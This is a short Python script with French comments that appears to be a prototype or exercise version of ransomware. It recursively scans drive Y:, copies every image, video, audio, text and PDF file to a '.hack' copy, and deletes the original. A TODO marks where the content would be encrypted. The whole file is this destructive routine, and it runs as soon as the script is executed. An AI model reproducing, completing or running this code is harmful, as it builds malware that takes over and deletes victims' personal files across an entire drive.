import os
import psutil
import glob

def explore(path):
    """
    Cette fonction récupère tous les chemins des fichiers d'un chemin donné en paramètre
    :param path: str, chemin que la fonction glob utilisera pour retourner les chemins de fichiers
    :return: list, liste contenant tous les chemins des fichiers exploré avec le chemin donné
    """
    chemin_str = fr"{path}"
    path_files = glob.glob(f'{chemin_str}/**/*', recursive = True)

    return path_files

def file_type(path):
    """
    Cette fonction détermine et retourne le type de fichié donné en paramètre
    :param path: str, le chemin du fichier pour lequel on veut savoir le type
    :return: str, le type du fichier
    """

    type = ''

    # Vérifie si le chemin donné correspond à un dossier ou un fichier
    # Si c'est un dossier, on retourne directement 'dir'
    if os.path.isdir(path):
        type = 'dir'
    # Si c'est un fichier
    elif os.path.isfile(path):
        # On détermine son extension avec os.path.splitext
        type = os.path.splitext(path)[1]

    return type

def chiffre(path):
    """
    Cette fonction ouvre un fichier en mode binaire et recopie son contenu vers un
    nom de fichier étendu de l'extension .hack avant d'effacer la source
    :param path: str, le chemin du fichier
    """
    with open(f"{path}", "rb") as fichier1:
        content = fichier1.read()

    with open(f"{path}.hack", "xb") as fichier2:
        fichier2.write(content)

    # TODO peut-être chiffrer le contenu du fichier

    os.remove(path)

compteur_fichiers_chiffres = 0

list_extensions = ['.jpg', '.png', '.txt', '.avi', '.mp4', '.mp3', '.pdf' ]

list_chemins_fichiers = explore(r'Y:')



for fichier in list_chemins_fichiers:
    if file_type(fichier) in list_extensions:
        chiffre(fichier)
        compteur_fichiers_chiffres+=1

print(compteur_fichiers_chiffres)